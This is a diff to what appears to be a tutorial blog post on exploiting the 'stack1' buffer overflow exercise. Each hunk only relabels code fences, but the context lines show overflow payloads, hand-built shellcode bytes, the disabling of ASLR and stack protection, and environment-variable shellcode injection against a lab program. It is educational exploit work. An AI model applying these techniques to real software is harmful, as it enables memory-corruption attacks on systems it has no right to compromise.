@@ -124,7 +124,7 @@ below listed ideas:
 All right! Let's start with the test execution of this program. Here's a
 brief description of the test system:
 
-```shell
+```bash
 # cat /etc/lsb-release | grep DESC
 DISTRIB_DESCRIPTION="Ubuntu 9.04"
 #
@@ -145,7 +145,7 @@ Below is the GCC command-line to compile the `stack1.c` source file. The
 `-mpreferred-stack-boundary=2` option is used to align stack entries at
 QWORD (8B) boundary:
 
-```shell
+```bash
 # gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c
 stack1.c: In function ‘main’:
 stack1.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
@@ -230,7 +230,7 @@ an overview of the security features implemented within the Linux
 kernel, ELF binaries and executing processes on a system. Here is a
 listing of its available options:
 
-```shell
+```bash
 $ ./checksec.sh
 Usage: checksec [OPTION]
 
@@ -255,7 +255,7 @@ Obtain the latest version of this script (1.5 as of this writing). Let's
 try the `--kernel` option to see available mitigation features
 implemented within the kernel on the test system:
 
-```shell
+```bash
 # ./checksec.sh --kernel
 * Kernel protection information:
 
@@ -289,7 +289,7 @@ The output above confirms that the GCC stack protector support is
 enabled and we have already seen it in action earlier. Let's now see
 what does this script has to say about the `stack1` ELF binary:
 
-```shell
+```bash
 # ./checksec.sh --file stack1
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   stack1
@@ -335,7 +335,7 @@ between. While overwriting EIP, it will also be overwritten and the
 `__stack_chk_fail` function would terminate the program before the
 message is printed:
 
-```shell
+```bash
 # perl -e 'print "A"x81' | ./stack1
 buf: bfb94544 cookie: bfb94540
 *** stack smashing detected ***: ./stack1 terminated
@@ -381,7 +381,7 @@ playground for our exploit attempts. Additionally, we see how the
 `checksec.sh` script correctly identifies the absence of stack canary
 and fortify source mitigation features from the program:
 
-```shell
+```bash
 # gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c
 stack1.c: In function ‘main’:
 stack1.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
@@ -435,7 +435,7 @@ From here we could proceed to the exploitation phase.
 For this solution we first need to calculate the offset between `buf`
 and `cookie`:
 
-```shell
+```bash
 # ./stack1
 buf: bfad87b4 cookie: bfad8804
 AAAAAAA
@@ -449,7 +449,7 @@ overwrite 80B of data to reach past the `buf` boundary. Once this is
 done, we're pointing at the cookie, which can then be overwritten with
 the desired content:
 
-```shell
+```bash
 # perl -e 'print "A"x80 . "\x44\x43\x42\x41"' | ./stack1
 buf: bfee2d14 cookie: bfee2d64
 you win!
@@ -516,7 +516,7 @@ Referring the call stack layout we saw earlier, the offset of EIP can be
 easily calculated. The `buf` 80B + cookie 4B + saved Frame Pointer 4B =
 88B. This is the offset of EIP from the start of the `buf` array:
 
-```shell
+```bash
 # perl -e 'print "A"x88 . "\x59\x84\x04\x08"' | ./stack1
 buf: bfebf464 cookie: bfebf4b4
 you win!
@@ -543,7 +543,7 @@ It tells that one of the mitigation features, `NX`, is enabled for the
 vulnerable `stack1` program. This means that when we execute this
 binary, it will have its stack segment marked as non-executable:
 
-```shell
+```bash
 # readelf -l stack1 | grep -i gnu_stack
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
 ```
@@ -562,7 +562,7 @@ then read on and try to think about why this might be happening.
 First we need to design a shellcode that simulates the `puts` call. I
 came up with the following:
 
-```shell
+```bash
 # cat -n printf.s
      1  # printf.s
      2  # sample program to print "you win!\n" message to stdout
@@ -604,7 +604,7 @@ shellcode writing tricks to remove NULL bytes from our shellcode,
 reducing its size and overcoming the addressing problem. Assemble and
 link the program to create a standalone binary:
 
-```shell
+```bash
 # as -o printf.o printf.s
 # ld -o printf printf.o
 # ./printf
@@ -650,7 +650,7 @@ Disassembly of section .text:
 
 Extract opcodes to create the required shellcode and calculate its size:
 
-```shell
+```bash
 # perl -e 'print "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a"' >shellcode.bin
 #
 # ls -lh shellcode.bin
@@ -667,7 +667,7 @@ exploit. Why is this so? If you had noticed earlier, both `buf` and
 `cookie`, although adjacent and aligned as expected, had different
 address on each invocation:
 
-```shell
+```bash
 # ./stack1
 buf: bfc21614 cookie: bfc21664
 AAAA
@@ -685,7 +685,7 @@ AAAA
 You would have already guessed by now. It is due to the `ASLR`
 mitigation feature that is active on the test system:
 
-```shell
+```bash
 # cat /proc/sys/kernel/randomize_va_space
 2
 #
@@ -710,7 +710,7 @@ systems it stores a value of 1 by default to indicate the presence of
 vanilla `ASLR`. Modifying this file with a value of 0 will immediately
 turn off this feature for all newly spawned processes:
 
-```shell
+```bash
 # cat /proc/sys/kernel/randomize_va_space
 2
 #
@@ -743,7 +743,7 @@ command-line to inject our shellcode at the location where this correct
 address could be overwritten. However, we were not able to get the
 shellcode executed:
 
-```shell
+```bash
 ./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
@@ -759,7 +759,7 @@ What could have gone wrong? A GDB analysis could help but this specific
 issue could be debugged without using it. Have a look at the shellcode
 once again:
 
-```shell
+```bash
 # hexdump -C shellcode.bin
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 09 cd  |..1.1.1.....Y...|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
@@ -781,7 +781,7 @@ shellcode that has the message with no newline character. However, a
 quick hack can be to remove the newline from the exploit command-line
 and test it:
 
-```shell
+```bash
 # perl -e 'print "\x90"x50 . "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a" . "\xd4\xf4\xff\xbf"' | ./stack1
 buf: bffff4d4 cookie: bffff524
 #
@@ -864,7 +864,7 @@ shellcode. If you have any queries regarding environment variable based
 exploitation, please refer **section 0x331 Using the Environment** from
 [Hacking - The Art of Exploitation](https://www.nostarch.com/hacking2.htm) book:
 
-```shell
+```bash
 # export WINCODE=$(cat shellcode.bin)
 #
 # echo $WINCODE | hexdump -C
@@ -886,7 +886,7 @@ environment variable. And it did work! However the output is not exactly
 what we had expected. There's no newline at the end. Here is what
 hexdump has to say about our exploit:
 
-```shell
+```bash
 # perl -e 'printf "A"x88 . "\x18\xf7\xff\xbf"' | ./stack1 | hexdump -C
 00000000  79 6f 75 20 77 69 6e 21  00                       |you win!.|
 00000009
@@ -897,7 +897,7 @@ echoed back when the shellcode executes. I made a small change to the
 original shellcode to include `0x0a` and `0x0d` characters and used it for
 testing:
 
-```shell
+```bash
 # perl -e 'print "\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a\x0d"' >shellcode.bin
 #
 # export WINCODE=$(cat shellcode.bin)# echo $WINCODE | hexdump -C 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
